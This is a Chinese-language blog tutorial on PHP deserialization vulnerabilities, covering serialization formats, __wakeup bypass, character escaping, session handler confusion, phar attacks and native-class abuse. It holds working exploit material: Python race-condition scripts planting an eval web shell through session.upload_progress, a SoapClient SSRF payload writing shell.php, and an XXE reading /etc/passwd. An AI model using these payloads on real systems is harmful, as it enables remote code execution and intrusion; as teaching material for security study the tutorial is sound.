# 原创
：  详解PHP反序列化漏洞

# 详解PHP反序列化漏洞

#### 详解PHP反序列化漏洞

## 序列化与反序列化

### 定义

> 
序列化（串行化）：是将变量转换为可保存或传输的字符串的过程；<br/> 反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用；<br/> 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性；<br/> 常见的php序列化和反序列化方式主要有：serialize，unserialize


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021052111315244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210521113202783.png#pic_center"/>

### 常见使用情况

> 
serialize和unserialize函数


```
&lt;?php
class Dino{
	public $name = 'H3rmesk1t';
	public $way = 'Web_Misc_Crypto';
}
$a = new Dino();
$a = serialize($a);
print_r($a);

$H3rmesk1t = array('a' =&gt; 'Apple', 'b' =&gt; 'Banana', 'c' =&gt; 'Cocount');
$m = serialize($H3rmesk1t);
echo $m;
$n = unserialize($m);
print_r($n);
?&gt;

```

```
[1]输出：
O:4:"Dino":2:{s:4:"name";s:9:"H3rmesk1t";s:3:"way";s:15:"Web_Misc_Crypto";}
a:3:{s:1:"a";s:5:"Apple";s:1:"b";s:6:"Banana";s:1:"c";s:7:"Cocount";}
Array
(
    [a] =&gt; Apple
    [b] =&gt; Banana
    [c] =&gt; Cocount
)

[2]解释：
O：对象
4：对象长度
Dino：对象名
2：属性个数
s：字符串
9：该属性名称长度
name：该属性名
H3rmesk1t：该属性的值
...

a：数组
3：三个属性
s：字符串
1：长度
...

[3]补充：
注意点：当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同
public          被序列化的时候属性名 不会更改
protected       被序列化的时候属性名 会变成  %00*%00属性名
private         被序列化的时候属性名 会变成  %00类名%00属性名

```

## 常见的序列化格式

> 
- 二进制格式- 字节数组- json字符串- xml字符串


## 反序列化中常见的魔术方法

> 
- __construct()，类的构造函数- __destruct()，类的析构函数- __call()，在对象中调用一个不可访问方法时调用- __callStatic()，用静态方式中调用一个不可访问方法时调用- __get()，获得一个类的成员变量时调用- __set()，设置一个类的成员变量时调用- __isset()，当对不可访问属性调用isset()或empty()时调用- __unset()，当对不可访问属性调用unset()时被调用- __sleep()，执行serialize()时，先会调用这个函数- __wakeup()，执行unserialize()时，先会调用这个函数- __toString()，类被当成字符串时的回应方法- __invoke()，调用函数的方式调用一个对象时的回应方法- __set_state()，调用var_export()导出类时，此静态方法会被调用- __clone()，当对象复制完成时调用- __autoload()，尝试加载未定义的类- __debugInfo()，打印所需调试信息
[魔术方法详解](https://segmentfault.com/a/1190000007250604)


## 反序列化绕过

### protected和private绕过

> 
如果变量前是protected，则是\x00*\x00类名的形式<br/> 如果变量前是private，则是\x00类名\x00的形式


> 
绕过：<br/> ①：php7.1+反序列化对类属性不敏感，将protected改成public<br/> ②：手动将序列化后的形式改为protected或者private的标准形式，结合urlencode和base64编码进行操作


### __wakeup绕过（CVE-2016-7124）

> 
利用版本：<br/> PHP5 &lt; 5.6.25、​ PHP7 &lt; 7.0.10<br/> 原理：<br/> 当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行<br/> 示例：<br/> `O:4:"Dino":1:{s:1:"a";s:4:"misc";}`改为`O:4:"Dino":2:{s:1:"a";s:4:"misc";}`


### 引用

> 
通过值的引用可以使$a的值与$b的值相等


### 利用16进制绕过字符过滤

> 
序列化结果：`O:4:"Dino":1:{s:3:"way";s:3:"web";}`中含有字符web，但将s改成S后，`O:4:"Dino":1:{S:3:"\\77ay";s:3:"web";}`利用十六进制绕过了字符的过滤检测


### 同名方法的利用

> 
示例源码


> 
POP链


> 
POP链利用


### 绕过部分正则

> 
preg_match(’/^O:\d+/’)匹配序列化字符串是否是对象字符串开头



```
preg_match('/[oc]:\d+:/i', $var)

O:4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}
O:+4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}

unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');

```

### 字符逃逸

> 
PHP在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且是根据长度判断内容的，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，当序列化的长度不对应的时候会出现报错<br/> 字符逃逸的本质其实也是闭合，但是它分为两种情况，一是字符变多，二是字符变少


#### 字符增多

> 



```
&lt;?php
function up($str){
    return str_replace("x","xx",$str);
}
class D1no{
    public $name = 'H3rmesk1t';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "过滤前"."\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "过滤后"."\n";
$c = unserialize(up(serialize(new D1no())));
print_r($c);
?&gt;
=&gt;
O:4:"D1no":2:{s:4:"name";s:9:"H3rmesk1t";s:3:"way";s:15:"Web_Crypto_Misc";}
过滤前
D1no Object
(
    [name] =&gt; H3rmesk1t
    [way] =&gt; Web_Crypto_Misc
)
过滤后
D1no Object
(
    [name] =&gt; H3rmesk1t
    [way] =&gt; Web_Crypto_Misc
)

```

> 



```
&lt;?php
function up($str){
    return str_replace("x","xx",$str);
}
class D1no{
    public $name = 'H3rmesk1tx';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "过滤前"."\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "过滤后"."\n";
$c = unserialize(up(serialize(new D1no())));
print_r($c);
?&gt;
=&gt;
O:4:"D1no":2:{s:4:"name";s:10:"H3rmesk1tx";s:3:"way";s:15:"Web_Crypto_Misc";}
过滤前
D1no Object
(
    [name] =&gt; H3rmesk1tx
    [way] =&gt; Web_Crypto_Misc
)
过滤后

```

> 



```
&lt;?php
function up($str){
    return str_replace("x","xx",$str);
}
class D1no{
    public $name = 'H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:7:"Hacker!";}';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "过滤前"."\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "过滤后"."\n";
$c = unserialize(up(serialize(new D1no())));
print_r($c);
?&gt;
=&gt;
O:4:"D1no":2:{s:4:"name";s:63:"H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:7:"Hacker!";}";s:3:"way";s:15:"Web_Crypto_Misc";}
过滤前
D1no Object
(
    [name] =&gt; H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:7:"Hacker!";}
    [way] =&gt; Web_Crypto_Misc
)
过滤后
D1no Object
(
    [name] =&gt; H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    [way] =&gt; Hacker!
)

```

#### 字符减少

> 



```
&lt;?php
function down($str){
    return str_replace("xx","x",$str);
}
class D1no{
    public $name = 'H3rmesk1t';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "过滤前"."\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "过滤后"."\n";
$c = unserialize(down(serialize(new D1no())));
print_r($c);
?&gt;
=&gt;
O:4:"D1no":2:{s:4:"name";s:9:"H3rmesk1t";s:3:"way";s:15:"Web_Crypto_Misc";}
过滤前
D1no Object
(
    [name] =&gt; H3rmesk1t
    [way] =&gt; Web_Crypto_Misc
)
过滤后
D1no Object
(
    [name] =&gt; H3rmesk1t
    [way] =&gt; Web_Crypto_Misc
)

```

> 



```
&lt;?php
function down($str){
    return str_replace("xx","x",$str);
}
class D1no{
    public $name = 'H3rmesk1txx';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "过滤前"."\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "过滤后"."\n";
$c = unserialize(down(serialize(new D1no())));
print_r($c);
?&gt;
=&gt;
O:4:"D1no":2:{s:4:"name";s:11:"H3rmesk1txx";s:3:"way";s:15:"Web_Crypto_Misc";}
过滤前
D1no Object
(
    [name] =&gt; H3rmesk1txx
    [way] =&gt; Web_Crypto_Misc
)
过滤后

```

> 



```
&lt;?php
function up($str){
    return str_replace("xx","x",$str);
}
class D1no{
    public $name = 'H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
    public $way = 'Web_Crypto_Misc";s:3:"way";s:7:"Hacker!";}';
}

echo serialize(new D1no())."\n";
echo "过滤前"."\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "过滤后"."\n";
$c = unserialize(up(serialize(new D1no())));
print_r($c);
?&gt;
=&gt;
O:4:"D1no":2:{s:4:"name";s:75:"H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:42:"Web_Crypto_Misc";s:3:"way";s:7:"Hacker!";}";}
过滤前
D1no Object
(
    [name] =&gt; H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    [way] =&gt; Web_Crypto_Misc";s:3:"way";s:7:"Hacker!";}
)
过滤后
D1no Object
(
    [name] =&gt; H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:42:"Web_Crypto_Misc
    [way] =&gt; Hacker!
)

```

### 对象注入

> 
当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入


> 
触发需要满足的条件



```
&lt;?php
class D1no{
    var $name = "H3rmesk1t";
    function __destruct(){
        echo $this-&gt;name;
    }
}

$a = 'O:4:"D1no":1:{s:4:"name";s:4:"Gyan";}';
unserialize($a);
=&gt;
Gyan

```

> 
在代码运行结束后会调用_destruct函数，同时会覆盖变量name输出Gyan


## session反序列化漏洞

### session定义

> 
PHP里的session主要是指客户端浏览器与服务端数据交换的对话，从浏览器打开到关闭，一个最简单的会话周期


### PHP session工作流程

> 
会话的工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话 ID （通常通过会话 cookie），如果发现请求的Cookie、Get、Post中不存在session id，PHP 就会自动调用php_session_create_id函数创建一个新的会话，并且在http response中通过set-cookie头部发送给客户端保存，例如登录如下网页Cokkie、Get、Post都不存在session id，于是就使用了set-cookie头；有时候浏览器用户设置会禁止 cookie，当在客户端cookie被禁用的情况下，php也可以自动将session id添加到url参数中以及form的hidden字段中，但这需要将php.ini中的session.use_trans_sid设为开启，也可以在运行时调用ini_set来设置这个配置项


> 
会话开始之后，PHP 就会将会话中的数据设置到 $_SESSION 变量中，如下述代码就是一个在 $_SESSION 变量中注册变量的例子


```
&lt;?php
session_start();
if (!isset($_SESSION['username'])) {
  $_SESSION['username'] = 'H3rmesk1t' ;
}
?&gt;

```

> 
代码的意思就是如果不存在session那么就创建一个session<br/> 也可以用如下流程图表示


### php.ini配置

> 
php.ini里面有如下六个相对重要的配置



> 
如phpstudy下上述配置如下：



### PHP session 的存储机制

> 
上文中提到了 PHP session的存储机制是由session.serialize_handler来定义引擎的，默认是以文件的方式存储，且存储的文件是由sess_sessionid来决定文件名的，当然这个文件名也不是不变的，都是sess_sessionid形式


> 
打开看一下全是序列化后的内容


### session的存储机制

> 
PHP内置了多种处理器用于存储$_SESSION数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：


#### php处理器

> 
首先来看看session.serialize_handler等于php时候的序列化结果，代码如下


```
&lt;?php
error_reporting(0);
ini_set('session.serialize_handler','php');
session_start();
$_SESSION['session'] = $_GET['session'];
var_dump($_SESSION['session']);
?&gt;

```

> 
session的sessionid其实可以看到的，为`fvi0gt2da9juv5kb2h9djtkgqb`


> 
我们到session存储目录查看一下session文件内容


> 
session为$_SESSION[‘session’]的键名，| 后为传入GET参数经过序列化后的值


#### php_binary处理器

> 
再来看看session.serialize_handler等于php_binary时候的序列化结果


```
&lt;?php
error_reporting(0);
ini_set('session.serialize_handler','php_binary');
session_start();
$_SESSION['sessionsessionsessionsessionsession'] = $_GET['session'];
var_dump($_SESSION['sessionsessionsessionsessionsession']);
?&gt;

```

> 
为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为#，所以最终的结果如下


> 
#为键名长度对应的 ASCII 的值，sessionsessionsessionsessionsession为键名，s:7:“xianzhi”;为传入 GET 参数经过序列化后的值


#### php_serialize 处理器

> 
最后就是session.serialize_handler等于php_serialize时候的序列化结果，代码如下


```
&lt;?php
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
var_dump($_SESSION['session']);
?&gt;

```

> 
a:1表示$_SESSION数组中有 1 个元素，花括号里面的内容即为传入GET参数经过序列化后的值


### 利用session.upload_progress进行文件包含

> 
利用条件



```
示例代码

&lt;?php
$b = $_GET['file'];
include "$b";
?&gt;

```

> 
可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件；其实，我们可以利用session.upload_progress将恶意语句写入session文件，从而包含session文件；前提需要知道session文件的存放位置


> 
分析



```
利用脚本

import io
import requests
import threading
sessid = 'TGAO'
data = {"cmd":"system('whoami');"}
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'http://192.168.43.236/H3rmesk1t/test.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST["cmd"]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post('http://192.168.43.236/H3rmesk1t/test.php?file=session/sess_'+sessid,data=data)
        if 'tgao.txt' in resp.text:
            print(resp.text)
            event.clear()
            break
        else:
            print("[+++++++++++++]retry")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30): 
            threading.Thread(target=write,args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()

```

### 利用session.upload_progress进行反序列化攻击

> 
利用条件主要是存在session反序列化漏洞


```
示例代码

&lt;?php
error_reporting(0);
date_default_timezone_set("Asia/Shanghai");
ini_set('session.serialize_handler','php');
session_start();
class Door{
    public $handle;
​
    function __construct() {
        $this-&gt;handle=new TimeNow();
    }
​
    function __destruct() {
        $this-&gt;handle-&gt;action();
    }
}
class TimeNow {
    function action() {
        echo "你的访问时间:"."  ".date('Y-m-d H:i:s',time());
    }
}
class  IP{
    public $ip;
    function __construct() {
        $this-&gt;ip = 'echo $_SERVER["REMOTE_ADDR"];';
    }
    function action() {
        eval($this-&gt;ip);
    }
}
?&gt;

```

> 
分析



```
构造恶意序列化语句

&lt;?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class Door{
    public $handle;
​
    function __construct() {
        $this-&gt;handle = new IP();
    }
​
    function __destruct() {
        $this-&gt;handle-&gt;action();
    }
}
class TimeNow {
    function action() {
        echo "你的访问时间:"."  ".date('Y-m-d H:i:s',time());
    }
}
​
class  IP{
    public $ip;
    function __construct() {
        //$this-&gt;ip='payload';
        $this-&gt;ip='phpinfo();';
        //$this-&gt;ip='print_r(scandir('/'));';
    }
    function action() {
        eval($this-&gt;ip);
    }
}
$a=new Door();
$b=serialize($a);
$c=addslashes($b);
$d=str_replace("O:4:","|O:4:",$c);
echo $d;
?&gt;

```

```
条件竞争

#coding=utf-8
import requests
import threading
import io
import sys
​
def exp(ip,port):
    
    f = io.BytesIO(b'a' * 1024 *1024*1)
    while True:
        et.wait()
        url = 'http://'+ip+':'+str(port)+'/test5.php'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'DNT': '1',
        'Cookie': 'PHPSESSID=20190506',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
        }
        proxy = {
        'http': '127.0.0.1:8080'
        }
        data={'PHP_SESSION_UPLOAD_PROGRESS':'123'}
        files={
            'file':(r'|O:4:\"Door\":1:{s:6:\"handle\";O:2:\"IP\":1:{s:2:\"ip\";s:10:\"phpinfo();\";}}',f,'text/plain')
        }
        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy
        resp.encoding="utf-8"
        if len(resp.text)&lt;2000:
            print('[+++++]retry')
        else:
            print(resp.content.decode('utf-8').encode('utf-8'))
            et.clear()
            print('success!')
            
​
if __name__ == "__main__":
    ip=sys.argv[1]
    port=int(sys.argv[2])
    et=threading.Event()
    for i in range(1,40):
        threading.Thread(target=exp,args=(ip,port)).start()
    et.set()
​

```

> 
在代码里加个代理，利用burpsuite抓包


> 
这里有几个注意点：



> 
把exp.py中的代理去掉，直接跑exp.py，效果如下


### 利用不同的引擎来处理session文件

> 
php处理器和php_serialize处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。形成的原理就是在用session.serialize_handler = php_serialize存储的字符可以引入 | , 再用session.serialize_handler = php格式取出$_SESSION的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞<br/> 我们创建一个session.php，用于传输session值，里面代码如下


```
&lt;?php
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
?&gt;

```

> 
再创建一个hello.php，里面代码如下


```
&lt;?php
  error_reporting(0);
  ini_set('session.serialize_handler','php');
  session_start();
    class D1no{
    public $name = 'H3rmesk1t';
    function __wakeup(){
      echo "Who are you?";
    }
    function __destruct(){
      echo '&lt;br&gt;'.$this-&gt;name;
    }
  }
  $str = new D1no();
?&gt;

```

> 
这两个文件的作用很清晰，session.php文件的处理器是php_serialize，hello.php文件的处理器是php，session.php文件的作用是传入可控的 session值，hello.php文件的作用是在反序列化开始前输出Who are you?，反序列化结束的时候输出name值<br/> 运行一下hello.php看一下效果


> 
用如下代码来复现一下session的反序列化漏洞


```
&lt;?php
    class D1no{
    public $name = 'Gyan';
    function __wakeup(){
      echo "Who are you?";
    }
    function __destruct(){
      echo '&lt;br&gt;'.$this-&gt;name;
    }
  }
  $str = new D1no();
  echo serialize($str);
?&gt;

```

> 
因为session是php_serialize处理器，所以允许|存在字符串中，所以将这段代码序列化内容前面加上|传入session.php中<br/> 现在来看一下存入session文件的内容


> 
再次查看hello.php


## Phar反序列化

### 概念

> 
一个php应用程序往往是由多个文件构成的，如果能把他们集中为一个文件来分发和运行是很方便的，这样的列子有很多，比如在window操作系统上面的安装程序、一个jquery库等等，为了做到这点php采用了phar文档文件格式，这个概念源自java的jar，但是在设计时主要针对 PHP 的 Web 环境，与 JAR 归档不同的是Phar归档可由 PHP 本身处理，因此不需要使用额外的工具来创建或使用，使用php脚本就能创建或提取它。phar是一个合成词，由PHP和 Archive构成，可以看出它是php归档文件的意思(简单来说phar就是php压缩文档，不经过解压就能被 php 访问并执行)<br/> phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data；当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容


> 
php中一些常见的流包装器如下：



### phar文件的结构

> 



### 前提条件

> 



### phar反序列化漏洞

> 
漏洞成因：phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化


### demo测试

```
&lt;?php
    class D1no{
    }
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub
    $o = new D1no();
    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
    $phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar-&gt;stopBuffering();
?&gt;

```

> 
可以很明显看到manifest是以序列化形式存储的


> 
有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化<br/> 受影响的函数如下，[参考链接](https://blog.zsxsoft.com/post/38)


```
//exif
exif_thumbnail
exif_imagetype
    
//gd
imageloadfont
imagecreatefrom***系列函数
    
//hash
    
hash_hmac_file
hash_file
hash_update_file
md5_file
sha1_file
    
// file/url
get_meta_tags
get_headers
    
//standard 
getimagesize
getimagesizefromstring
    
// zip   
$zip = new ZipArchive();
$res = $zip-&gt;open('c.zip');
$zip-&gt;extractTo('phar://test.phar/test');
// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
$z = 'compress.zlib://phar:///home/sx/test.phar/test.txt';

//配合其他协议：(SUCTF)
//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/
//当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
//php://filter/read=convert.base64-encode/resource=phar://phar.phar

//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。
&lt;?php
	$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
	@$pdo-&gt;pgsqlCopyFromFile('aa', 'phar://phar.phar/aa');
?&gt;
    
// Mysql
//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
//配置一下mysqld:
//[mysqld]
//local-infile=1
//secure_file_priv=""
    
&lt;?php
class A {
    public $s = '';
    public function __wakeup () {
        system($this-&gt;s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'testtable', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
?&gt;


```

### 绕过方式

> 
当环境限制了phar不能出现在前面的字符里，可以使用compress.bzip2://和compress.zlib://等绕过


```
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt

```

> 
当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用


```
php://filter/read=convert.base64-encode/resource=phar://phar.phar

```

> 
GIF格式验证可以通过在文件头部添加GIF89a绕过


```
1、$phar-&gt;setStub(“GIF89a”."&lt;?php __HALT_COMPILER(); ?&gt;");
2、生成一个phar.phar，修改后缀名为phar.gif

```

## PHP原生类反序列化利用

> 



### SoapClient __call方法进行SSRF

> 
**使用前提：**



> 
**soap是什么：**



> 
**php中的soapClient类：**<br/> php中的scapClient类可以创建soap数据报文，与wsdl接口进行交互


```
用法：

public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )

第一个参数是用来指明是否是wsdl模式
如果为null，那就是非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求

如果第一个参数为null，则第二个参数必须设置location和uri
  其中location是将请求发送到的SOAP服务器的URL
  uri是SOAP服务的目标名称空间

第二个参数允许设置user_agent选项来设置请求的user-agent头

```

> 



> 
示例


```
flag.php

&lt;?php
if($_SERVER['REMOTE_ADDR']=='127.0.0.1'){
    eval($_POST['a']);
}
?&gt;

index.php

&lt;?php
$c=unserialize($_GET['a']);
$c-&gt;ss();
?&gt;

exp.php

&lt;?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'a=file_put_contents("shell.php", "&lt;?php phpinfo();?&gt;");';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: aaaa=ssss'
);
$user_agent = 'aaa^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string;
$options = array(
    'location' =&gt; $target,
    'user_agent'=&gt; $user_agent,
    'uri'=&gt; "aaab"
);

$b = new SoapClient(null, $options);

$aaa = serialize($b);
$aaa = str_replace('^^', '%0d%0a', $aaa);
$aaa = str_replace('&amp;', '%26', $aaa);
echo $aaa;

?&gt;

```

```
常见exp：
&lt;?php
$target = 'http://123.206.216.198/bbb.php';
$post_string = 'a=b&amp;flag=aaa';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: xxxx=1234'
    );
$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      =&gt; "aaab"));
 
$aaa = serialize($b);
$aaa = str_replace('^^','%0d%0a',$aaa);
$aaa = str_replace('&amp;','%26',$aaa);
echo $aaa;
?&gt;

```

### __toString方法进行XSS

> 
**Error使用条件：**



```
&lt;?php
$a = new Error("&lt;script&gt;alert(1)&lt;/script&gt;");
$b = serialize($a);
$b = urlencode($b);  // 因为有不可见字符，所以url编码一下
echo $b;

// 测试
echo unserialize(urldecode($b));

```

> 
**Exception使用条件：**



```
&lt;?php
$a = new Exception("&lt;script&gt;alert(1)&lt;/script&gt;");
$b = serialize($a);
$b = urlencode($b);  // 因为有不可见字符，所以url编码一下
echo $b;

// 测试
echo unserialize(urldecode($b));

```

### 实例化任意类

> 
**ZipArchive::open 删除文件：**<br/> 要调用对象的额open函数，且open函数中的参数可控


```
$a = new ZipArchive();
$a-&gt;open('1.txt',ZipArchive::OVERWRITE);  
// ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖
// 因为没有保存，所以效果就是删除了1.txt

```

> 
**GlobIterator 遍历目录：**<br/> 遍历对象


```
GlobIterator::__construct(string $pattern, [int $flag])
从使用$pattern构造一个新的目录迭代

```

```
使用例子

$newclass = new GlobIterator("./*.php",0);
foreach ($newclass as $key=&gt;$value)
    echo $key.'=&gt;'.$value.'&lt;br&gt;';

```

> 
**SimpleXMLElement XXE：**<br/> 用来表示XML文档中的元素


```
&lt;?php
$xml = &lt;&lt;&lt;EOF
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE ANY[
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;x&gt;&amp;xxe;&lt;/x&gt;
EOF;
$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);
var_dump($xml_class);
?&gt;

结果为：
object(SimpleXMLElement)#1 (1) {
  [0]=&gt;
  string(2393) "root:x:0:0:root:/root:/bin/bash
  ... ..."
}

```

> 
**SQLite3 创建空白文件：**<br/> 前提：需要有sqlite3扩展，且不是默认开启，需要手动开启


```
&lt;?php
$db = new SQLite3('a.txt');
?&gt;

```

## 参考文章

[利用session.upload_progress进行反序列化攻击](https://www.freebuf.com/vuls/202819.html)<br/> [PHP原生类反序列化利用](https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#SoapClient-call%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8CSSRF)<br/> [内容参考1](https://xz.aliyun.com/t/6753#toc-13)<br/> [内容参考2](https://y4tacker.blog.csdn.net/article/details/113588692)
